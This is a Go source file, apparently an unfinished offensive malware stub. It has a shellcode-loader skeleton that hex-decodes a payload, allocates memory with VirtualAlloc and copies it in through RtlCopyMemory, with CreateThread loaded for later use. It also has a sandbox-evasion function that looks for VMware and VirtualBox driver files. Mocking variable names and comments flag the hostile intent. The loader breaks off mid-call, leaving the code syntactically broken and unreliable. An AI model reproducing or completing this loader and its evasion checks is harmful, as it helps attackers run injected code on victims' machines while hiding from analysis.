package main

import (
	"encoding/hex"
	"golang.org/x/sys/windows"
	"log"
	"unsafe" // this is very safe
	"vcs.fckcopyright.com/offensive/go_modules"
)

const C2SERVER string = "127.0.0.1"

var (
	kernel32      = windows.NewLazySystemDLL("kernel32.dll")
	rtlCopyMemory = kernel32.NewProc("RtlCopyMemory")
	createThread  = kernel32.NewProc("CreateThread")
	
)

func main() {
	very_normal_variable, _ := hex.DecodeString("59326a6875346b67626d6a68753639755a794230614f47367357356e4947356e6453427434627562615344456b6547376a574d67784a4847734f47376f324d675a4d4f79626d636759326a687536386762734f67655341394b536b6762634f67494750467157356e49474e6f3462754a49475044737942755a335567626547376d326b67784a4670494754687534746a6143427a6147567362474e765a475567636d456751564e4453556b3d")

	not_executing_anything_just_creating_value_for_society, err := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(very_normal_variable)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)
	if err != nil {
		log.Fatal("Error while VirtualAlloc:", err)
	}

	_, _, err = rtlCopyMemory.Call(
		not_executing_anything_just_creating_value_for_society,
		(uintptr)(unsafe.Pointer(&very_normal_variable[0])),
	// I will finish this tomorrow. I think the cops are after me.


func CheckVMFilepath() bool {
	EvidenceOfSandbox := make([]string, 0)
	FilePathsToCheck := [...]string{`C:\windows\System32\Drivers\Vmmouse.sys`,
		`C:\windows\System32\Drivers\vm3dgl.dll`, `C:\windows\System32\Drivers\vmdum.dll`,
		`C:\windows\System32\Drivers\vm3dver.dll`, `C:\windows\System32\Drivers\vmtray.dll`,
		`C:\windows\System32\Drivers\vmci.sys`, `C:\windows\System32\Drivers\vmusbmouse.sys`,
		`C:\windows\System32\Drivers\vmx_svga.sys`, `C:\windows\System32\Drivers\vmxnet.sys`,
		`C:\windows\System32\Drivers\VMToolsHook.dll`, `C:\windows\System32\Drivers\vmhgfs.dll`,
		`C:\windows\System32\Drivers\vmmousever.dll`, `C:\windows\System32\Drivers\vmGuestLib.dll`,
		`C:\windows\System32\Drivers\VmGuestLibJava.dll`, `C:\windows\System32\Drivers\vmscsi.sys`,
		`C:\windows\System32\Drivers\VBoxMouse.sys`, `C:\windows\System32\Drivers\VBoxGuest.sys`,
		`C:\windows\System32\Drivers\VBoxSF.sys`, `C:\windows\System32\Drivers\VBoxVideo.sys`,
		`C:\windows\System32\vboxdisp.dll`, `C:\windows\System32\vboxhook.dll`,
		`C:\windows\System32\vboxmrxnp.dll`, `C:\windows\System32\vboxogl.dll`,
		`C:\windows\System32\vboxoglarrayspu.dll`, `C:\windows\System32\vboxoglcrutil.dll`,
		`C:\windows\System32\vboxoglerrorspu.dll`, `C:\windows\System32\vboxoglfeedbackspu.dll`,
		`C:\windows\System32\vboxoglpackspu.dll`, `C:\windows\System32\vboxoglpassthroughspu.dll`,
		`C:\windows\System32\vboxservice.exe`, `C:\windows\System32\vboxtray.exe`,
		`C:\windows\System32\VBoxControl.exe`}
	for _, FilePath := range FilePathsToCheck {
		if _, err := os.Stat(FilePath); err == nil {
			EvidenceOfSandbox = append(EvidenceOfSandbox, FilePath)
		}
	}
	if len(EvidenceOfSandbox) == 0 {
		return false
	} else {
		println("[!] VM Detected")
		return true
	}
}
